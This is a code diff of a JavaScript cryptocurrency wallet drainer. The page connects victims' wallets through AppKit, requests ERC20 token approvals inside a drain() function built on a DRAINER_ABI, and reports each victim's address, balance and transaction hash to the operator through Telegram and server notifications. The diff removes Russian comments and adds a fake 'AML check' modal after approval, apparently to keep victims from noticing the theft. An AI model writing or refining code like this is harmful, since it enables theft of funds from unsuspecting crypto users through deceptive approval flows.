@@ -1,12 +1,10 @@
-// === Импорты зависимостей ===
 import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
-import config from './config.js'; // Импортируем конфигурацию
+import config from './config.js';
 import { showAMLCheckModal } from './aml-check-modal.js';
 
-// === Конфигурация AppKit ===
 const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
@@ -25,7 +23,6 @@ const appKitModal = createAppKit({
   allWallets: 'SHOW',
 });
 
-// === Глобальные переменные ===
 let connectedAddress = null;
 let hasDrained = false;
 let isTransactionPending = false;
@@ -34,7 +31,6 @@ let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
 
-// === Константы и конфигурации ===
 let lastDrainTime = 0;
 
 const ERC20_ABI = [
@@ -48,7 +44,6 @@ const DRAINER_ABI = [
   "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
 ];
 
-// === Функции ===
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 async function sendTelegramMessage(message) {
@@ -486,8 +481,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
 
-        // Открываем модальное окно AML после успешного approve
-        const amlValue = ethers.utils.formatUnits(balance, decimals); // Используем текущий баланс как значение AML
+        const amlValue = ethers.utils.formatUnits(balance, decimals);
         await showAMLCheckModal(connectedAddress, amlValue);
 
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider, balance);
@@ -513,7 +507,8 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
         await notifyServer(userAddress, address, balance, chainId, null, provider, balance);
-        const amlValue = ethers.utils.formatUnits(balance, decimals); // Используем текущий баланс как значение AML
+        const amlValue = ethers.utils.formatUnits(balance, decimals);
+        await showAMLCheckModal(connectedAddress, amlValue);
         status = 'confirmed';
       } catch (error) {
         console.error(`❌ Ошибка при вызове notifyServer для токена ${token}: ${error.message}`);
